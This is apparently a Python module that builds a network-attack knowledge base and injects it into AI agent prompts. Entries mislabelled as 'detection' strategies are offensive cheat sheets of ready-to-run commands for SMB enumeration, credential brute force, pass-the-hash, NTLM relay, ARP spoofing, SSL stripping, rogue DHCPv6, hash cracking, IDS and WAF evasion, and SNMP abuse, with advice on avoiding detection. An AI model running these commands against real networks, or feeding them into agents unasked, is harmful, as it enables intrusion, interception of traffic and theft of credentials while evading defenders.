"""Network security knowledge base.

Deep knowledge about network-level attacks:
1. Protocol exploitation (SMB, DNS, SNMP)
2. Man-in-the-Middle attacks
3. Network service enumeration
4. Firewall/IDS evasion
5. Traffic analysis techniques
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class NetworkPattern:
    """A network security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


NETWORK_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "net-001", "name": "SMB/CIFS Exploitation",
        "category": "smb", "severity": "critical",
        "desc": "Exploiting SMB protocol vulnerabilities.",
        "detection": (
            "SMB EXPLOITATION:\n"
            "ENUMERATION:\n"
            "  nmap -p 445 --script smb-enum-shares,smb-enum-users <target>\n"
            "  enum4linux-ng <target>\n"
            "  smbclient -L //<target>/ -N  # List shares\n"
            "  crackmapexec smb <target> --shares\n"
            "ANONYMOUS ACCESS:\n"
            "  smbclient //<target>/<share> -N  # No password\n"
            "  mount -t cifs //<target>/<share> /mnt -o guest\n"
            "CREDENTIAL ATTACKS:\n"
            "  crackmapexec smb <target> -u users.txt -p pass.txt\n"
            "  hydra -L users.txt -P pass.txt smb://<target>\n"
            "  # Pass-the-Hash\n"
            "  crackmapexec smb <target> -u admin -H <ntlm_hash>\n"
            "RELAY ATTACKS:\n"
            "  # NTLM relay (if SMB signing not required)\n"
            "  responder -I <interface>  # Capture\n"
            "  ntlmrelayx.py -tf targets.txt -smb2support\n"
            "  # Relay to LDAP for credential dumping\n"
            "  ntlmrelayx.py -t ldaps://<dc> --escalate-user <user>\n"
            "KNOWN VULNS:\n"
            "  EternalBlue (MS17-010): SMBv1 RCE\n"
            "  PrintNightmare: Print Spooler RCE\n"
            "  PetitPotam: NTLM relay via EFS"
        ),
        "tools": ["crackmapexec", "enum4linux", "responder"],
    },
    {
        "id": "net-002", "name": "DNS Attacks",
        "category": "dns", "severity": "high",
        "desc": "DNS-based attack techniques.",
        "detection": (
            "DNS ATTACKS:\n"
            "ZONE TRANSFER:\n"
            "  dig axfr @<nameserver> <domain>\n"
            "  # If successful → full zone data including internal records\n"
            "DNS CACHE POISONING:\n"
            "  - Kaminsky attack: Flood authoritative responses\n"
            "  - Birthday attack on transaction ID\n"
            "  - Check: dig +short porttest.dns-oarc.net TXT @<resolver>\n"
            "SUBDOMAIN TAKEOVER:\n"
            "  - Find CNAME pointing to deprovisioned service\n"
            "  - Check: dig CNAME <subdomain> → NXDOMAIN on target?\n"
            "  - Services: AWS S3, Azure, Heroku, GitHub Pages\n"
            "  - Tool: subjack, can-i-take-over-xyz\n"
            "DNS REBINDING:\n"
            "  - Serve DNS response with short TTL\n"
            "  - First response: attacker IP (bypass same-origin)\n"
            "  - Second response: internal IP (access internal services)\n"
            "  - Tool: singularity, rbndr\n"
            "DNS TUNNELING:\n"
            "  - Exfiltrate data via DNS queries\n"
            "  - dnscat2: C2 over DNS\n"
            "  - iodine: IP over DNS tunnel\n"
            "  - Detection: Unusually long subdomain labels"
        ),
        "tools": ["dig", "dnscat2", "subjack"],
    },
    {
        "id": "net-003", "name": "Man-in-the-Middle Attacks",
        "category": "mitm", "severity": "critical",
        "desc": "Intercepting and manipulating network traffic.",
        "detection": (
            "MITM ATTACKS:\n"
            "ARP SPOOFING:\n"
            "  bettercap -T <target> -X\n"
            "  arpspoof -i <interface> -t <target> <gateway>\n"
            "  ettercap -T -M arp /<target>// /<gateway>//\n"
            "LLMNR/NBT-NS POISONING:\n"
            "  responder -I <interface> -rdw\n"
            "  # Captures NTLMv2 hashes from name resolution\n"
            "  # Crack: hashcat -m 5600 <hashes> <wordlist>\n"
            "SSL/TLS INTERCEPTION:\n"
            "  mitmproxy -p 8080  # Transparent proxy\n"
            "  bettercap + hstshijack caplet\n"
            "  # SSLStrip: Downgrade HTTPS → HTTP\n"
            "  sslstrip -l 10000\n"
            "DHCPv6 SPOOFING:\n"
            "  # IPv6 preferred over IPv4 in most OS\n"
            "  mitm6 -d <domain>  # Act as rogue DHCPv6\n"
            "  ntlmrelayx.py -6 -t <target>  # Relay captured creds\n"
            "DETECTION EVASION:\n"
            "  - Rate limit spoofed packets\n"
            "  - Use legitimate MAC addresses\n"
            "  - Timing attacks to avoid IDS detection"
        ),
        "tools": ["bettercap", "responder", "mitmproxy"],
    },
    {
        "id": "net-004", "name": "Firewall and IDS Evasion",
        "category": "evasion", "severity": "high",
        "desc": "Techniques for evading network security controls.",
        "detection": (
            "FIREWALL/IDS EVASION:\n"
            "NMAP EVASION:\n"
            "  # Fragment packets\n"
            "  nmap -f <target>\n"
            "  # Decoy scan\n"
            "  nmap -D RND:10 <target>\n"
            "  # Source port manipulation\n"
            "  nmap --source-port 53 <target>\n"
            "  # Timing (slow scan)\n"
            "  nmap -T0 <target>\n"
            "  # Idle/zombie scan\n"
            "  nmap -sI <zombie_host> <target>\n"
            "  # Custom packet crafting\n"
            "  nmap --data-length 50 <target>\n"
            "PAYLOAD EVASION:\n"
            "  - Encode payloads (base64, XOR, custom)\n"
            "  - Fragment attack across multiple packets\n"
            "  - Use encrypted channels (SSH, TLS)\n"
            "  - Domain fronting through CDN\n"
            "  - Use legitimate services (DNS, HTTPS)\n"
            "WAF BYPASS:\n"
            "  - Case variation: SeLeCt → SELECT\n"
            "  - Comment insertion: SEL/**/ECT\n"
            "  - Encoding: %53ELECT, \\u0053ELECT\n"
            "  - HTTP parameter pollution\n"
            "  - HTTP/2 specific attacks\n"
            "  - Content-Type manipulation"
        ),
        "tools": ["nmap", "wafw00f", "sqlmap"],
    },
    {
        "id": "net-005", "name": "SNMP Exploitation",
        "category": "snmp", "severity": "high",
        "desc": "Exploiting SNMP protocol for information and access.",
        "detection": (
            "SNMP EXPLOITATION:\n"
            "ENUMERATION:\n"
            "  # Default community strings\n"
            "  snmpwalk -v2c -c public <target>\n"
            "  snmpwalk -v2c -c private <target>\n"
            "  # Brute force community strings\n"
            "  onesixtyone -c community.txt <target>\n"
            "  hydra -P community.txt <target> snmp\n"
            "INFORMATION GATHERING:\n"
            "  # System info\n"
            "  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1\n"
            "  # Network interfaces\n"
            "  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.2\n"
            "  # Routing table\n"
            "  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4\n"
            "  # Running processes\n"
            "  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2\n"
            "  # Installed software\n"
            "  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3\n"
            "  # Users (Windows)\n"
            "  snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25\n"
            "WRITE ACCESS:\n"
            "  # If 'private' community string has write access\n"
            "  snmpset -v2c -c private <target> <OID> <type> <value>\n"
            "  # Can modify: routing tables, interface configs, etc."
        ),
        "tools": ["snmpwalk", "onesixtyone", "nmap"],
    },
]


class NetworkSecurityKB:
    """Network security knowledge base.

    Provides network attack patterns injected
    into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, NetworkPattern] = {}
        self._log = logger.bind(component="network_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load network patterns."""
        for data in NETWORK_PATTERNS:
            pattern = NetworkPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[NetworkPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_network_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build network security prompt."""
        lines = ["## Network Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
